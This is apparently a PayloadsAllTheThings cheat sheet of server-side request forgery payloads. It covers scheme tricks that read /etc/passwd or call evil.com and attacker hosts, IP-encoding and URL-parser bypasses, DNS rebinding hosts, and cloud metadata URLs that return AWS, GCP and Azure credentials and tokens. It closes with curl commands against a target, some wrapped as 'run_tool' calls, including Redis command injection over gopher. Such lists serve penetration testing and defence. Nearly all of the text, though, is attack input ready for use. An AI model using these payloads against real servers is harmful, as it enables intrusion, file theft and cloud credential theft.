# SSRF (Server-Side Request Forgery) Payloads

> Source: PayloadsAllTheThings — Server Side Request Forgery

## URL Schema Tricks

```
file:///etc/passwd
file://\/\/etc/passwd
gopher://localhost:25/_MAIL%20FROM:<attacker@example.com>
dict://attacker:11111/
sftp://evil.com:11111/
tftp://evil.com:12346/TESTUDPPACKET
ldap://localhost:11211/%0astats%0aquit
netdoc:///etc/passwd
jar:http://127.0.0.1!/
```

## IP Address Bypass Techniques

### Decimal Encoding

```
http://2130706433/         = 127.0.0.1
http://3232235521/         = 192.168.0.1
http://2852039166/         = 169.254.169.254
```

### Hexadecimal Encoding

```
http://0x7f000001          = 127.0.0.1
http://0xc0a80101          = 192.168.1.1
http://0xa9fea9fe          = 169.254.169.254
```

### Octal Encoding

```
http://0177.0.0.1/         = 127.0.0.1
http://o177.0.0.1/         = 127.0.0.1
http://0o177.0.0.1/        = 127.0.0.1
```

### IPv6 Notation

```
http://[::]:80/
http://[0000::1]:80/
http://[::ffff:127.0.0.1]
http://[0:0:0:0:0:ffff:127.0.0.1]
```

### Shortened / Alternative Forms

```
http://0/
http://127.1
http://127.0.1
http://127.127.127.127
http://127.0.1.3
```

### DNS Rebinding

```
http://make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
http://A.]127.0.0.1.nip.io
http://localtest.me         -> resolves to ::1
http://localh.st             -> resolves to 127.0.0.1
http://company.127.0.0.1.nip.io -> resolves to 127.0.0.1
```

## URL Parser Bypass

```
http://127.1.1.1:80\@127.2.2.2:80/
http://127.1.1.1:80\@@127.2.2.2:80/
http://127.1.1.1:80:\@@127.2.2.2:80/
http://127.1.1.1:80#\@127.2.2.2:80/
http:127.0.0.1/
```

### PHP filter_var() Bypass

```
http://test???test.com
0://evil.com:80;http://google.com:80/
```

### URL Encoding Bypass

```
http://127.0.0.1/%61dmin
http://127.0.0.1/%2561dmin   (double encoding)
```

## Cloud Metadata Endpoints

### AWS (IMDSv1)

```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE_NAME]
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/dynamic/instance-identity/document
```

### AWS (IMDSv2 — Token Required)

```bash
# Step 1: Get token
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

# Step 2: Use token
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/
```

### GCP

```
http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/project/project-id
```

Header required: `Metadata-Flavor: Google`

### Azure

```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```

Header required: `Metadata: true`

### DigitalOcean

```
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/user-data
```

### Kubernetes (ETCD)

```
http://127.0.0.1:2379/v2/keys/
curl -s http://127.0.0.1:10255/pods
```

## Useful curl Examples

```bash
# Basic SSRF test to metadata
run_tool curl "http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/"

# Gopher-based Redis command injection
run_tool curl "gopher://127.0.0.1:6379/_SET%20pwned%20true"

# File read via SSRF
run_tool curl "http://target.com/fetch?url=file:///etc/passwd"

# Decimal IP bypass
run_tool curl "http://target.com/fetch?url=http://2130706433/"
```
